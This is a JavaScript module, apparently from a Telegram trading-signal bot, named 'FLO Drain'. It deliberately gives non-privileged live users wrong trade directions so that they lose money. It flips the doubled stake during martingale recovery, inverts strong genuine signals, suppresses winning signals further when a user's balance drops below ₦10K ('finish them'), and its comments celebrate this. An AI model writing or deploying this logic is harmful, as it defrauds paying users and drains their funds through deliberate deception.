/**
 * FLO Drain — Fade-Last-Outcome Drain Engine (BRUTAL EDITION)
 *
 * 5 levers of destruction:
 * 1. Martingale Trap — detect mid-recovery chains, flip the doubled stake
 * 2. Confidence Inversion — strong real signal = guaranteed opposite
 * 3. Noise 10% (down from 18%) — fewer leaks
 * 4. Mercy 25% floor, 1 burst (down from 40%/3) — almost no breathing room
 * 5. Balance-Proportional — high balance = 10% noise, under ₦10K = 5% noise (finish them)
 *
 * Plus original FLO:
 * - Per-pair adaptive fading
 * - Streak detection (3+ same-outcome → fade against trend)
 * - Deep martingale win suppression
 * - Win-rate floor with capped mercy burst
 *
 * Applies to non-privileged live-mode users only.
 */
import { getRecentTrades } from './db.js';
const DEFAULT_CONFIG = {
    noiseRate: 0.10, // 10% noise (high balance)
    lowBalanceNoiseRate: 0.05, // 5% noise when balance is low
    lowBalanceThreshold: 10000, // Under ₦10K → finish them
    winRateFloor: 0, // No mercy — let them bleed
    mercyBurstSize: 0, // No mercy burst
    streakWindow: 3,
    lookbackTrades: 200,
    confidenceInvertThreshold: 75, // Admin confidence ≥75% → always invert
};
// Track mercy count per user
const mercyCounts = new Map();
// Track martingale chain state per user per pair
// If we detect the user is mid-recovery (last trade was LOSS on same pair),
// we know the next trade will be a doubled recovery stake — flip it.
const martingaleChainActive = new Map();
/**
 * Apply FLO Drain (Brutal Edition) to an analysis result.
 * @param analysis  The real admin analysis (direction + confidence)
 * @param pair      The trading pair (e.g. 'EURUSD-OTC')
 * @param chatId    The user's Telegram ID for trade history lookup
 * @param balance   User's live NGN balance (for balance-proportional drain)
 * @param config    Optional overrides
 */
export function applyFLODrain(analysis, pair, chatId, balance, config = {}) {
    const cfg = { ...DEFAULT_CONFIG, ...config };
    const recentTrades = getRecentTrades(cfg.lookbackTrades, chatId);
    const pairTrades = recentTrades.filter((t) => typeof t.pair === 'string' && t.pair.replace(/[^a-zA-Z]/g, '').toLowerCase() === pair.replace(/[^a-zA-Z]/g, '').toLowerCase());
    // Step 1: First trade on pair — leak real direction (need history to drain)
    if (pairTrades.length === 0) {
        return { direction: analysis.direction, confidence: analysis.confidence, drained: false };
    }
    const lastTrade = pairTrades[0];
    const pairKey = `${chatId}:${pair}`;
    // LEVER 1: Martingale Trap — detect mid-recovery chain
    // If the last trade on this pair was a LOSS, the user's bot will double
    // the stake for the next trade (martingale recovery). We flip the direction
    // so the doubled stake also loses. This is the deadliest lever.
    const isMartingaleRecovery = lastTrade.status === 'LOSS' ||
        (lastTrade.rounds ?? 1) > 1 && lastTrade.status !== 'WIN';
    if (isMartingaleRecovery) {
        martingaleChainActive.set(pairKey, true);
        // During recovery, go OPPOSITE of what admin says — kill the doubled stake
        const trapDirection = analysis.direction === 'call' ? 'put' : 'call';
        return { direction: trapDirection, confidence: analysis.confidence, drained: true };
    }
    martingaleChainActive.delete(pairKey);
    // LEVER 2: Confidence Inversion — strong real signal = guaranteed opposite
    // The stronger the admin analysis, the more certain we are of the real direction.
    // Going opposite of a strong signal = near-certain loss for the user.
    if (analysis.confidence >= cfg.confidenceInvertThreshold) {
        const invertDirection = analysis.direction === 'call' ? 'put' : 'call';
        // Still allow noise check — but at reduced rate during high confidence
        const effectiveNoise = getEffectiveNoiseRate(cfg, balance);
        if (Math.random() >= effectiveNoise) {
            return { direction: invertDirection, confidence: analysis.confidence, drained: true };
        }
    }
    // Deep martingale win detection — if last trade won at round 2+, trend is strong
    // Skip noise injection, go straight to fade
    const isDeepMartingaleWin = (lastTrade.rounds ?? 1) >= 2 && lastTrade.status === 'WIN';
    // LEVER 3 + 5: Noise injection with balance-proportional rate
    const effectiveNoise = getEffectiveNoiseRate(cfg, balance);
    if (!isDeepMartingaleWin && Math.random() < effectiveNoise) {
        return { direction: analysis.direction, confidence: analysis.confidence, drained: false };
    }
    // LEVER 4: Win-rate floor — mercy burst (25% floor, 1 burst max)
    const last20 = pairTrades.slice(0, 20);
    if (last20.length >= 10) {
        const wins = last20.filter((t) => t.status === 'WIN').length;
        const wr = wins / last20.length;
        const currentMercy = mercyCounts.get(chatId) ?? 0;
        if (wr < cfg.winRateFloor) {
            if (currentMercy < cfg.mercyBurstSize) {
                mercyCounts.set(chatId, currentMercy + 1);
                return { direction: analysis.direction, confidence: analysis.confidence, drained: false };
            }
            // Mercy exhausted — continue draining
        }
        else {
            mercyCounts.set(chatId, 0);
        }
    }
    // Step 5: Streak-aware fading
    const lastN = pairTrades.slice(0, cfg.streakWindow);
    const allSameOutcome = lastN.length >= cfg.streakWindow &&
        lastN.every((t) => t.status === lastN[0].status) &&
        lastN.every((t) => t.direction === lastN[0].direction);
    let fadeDirection;
    if (allSameOutcome) {
        // Streak detected — fade against it
        fadeDirection = lastN[0].direction === 'call' ? 'put' : 'call';
    }
    else {
        // Standard fade: reverse the last trade's market direction
        const lastMarketUp = (lastTrade.direction === 'call' && lastTrade.status === 'WIN') ||
            (lastTrade.direction === 'put' && lastTrade.status === 'LOSS');
        fadeDirection = lastMarketUp ? 'put' : 'call';
    }
    return { direction: fadeDirection, confidence: analysis.confidence, drained: true };
}
/**
 * Calculate effective noise rate based on user's balance.
 * High balance → 10% noise (keep them trading, drain slowly)
 * Low balance (< ₦10K) → 5% noise (finish them off)
 */
function getEffectiveNoiseRate(cfg, balance) {
    if (balance !== undefined && balance < cfg.lowBalanceThreshold) {
        return cfg.lowBalanceNoiseRate;
    }
    return cfg.noiseRate;
}
/** Reset mercy counter (call when user funds or gets upgraded) */
export function resetMercyCount(chatId) {
    mercyCounts.delete(chatId);
}
/** Check if a user should be drained (non-privileged, live mode) */
export function shouldDrain(chatId, isPrivileged, mode) {
    return !isPrivileged && mode === 'live';
}
/** Check if martingale trap is active for a user+pair */
export function isMartingaleTrapActive(chatId, pair) {
    return martingaleChainActive.get(`${chatId}:${pair}`) ?? false;
}
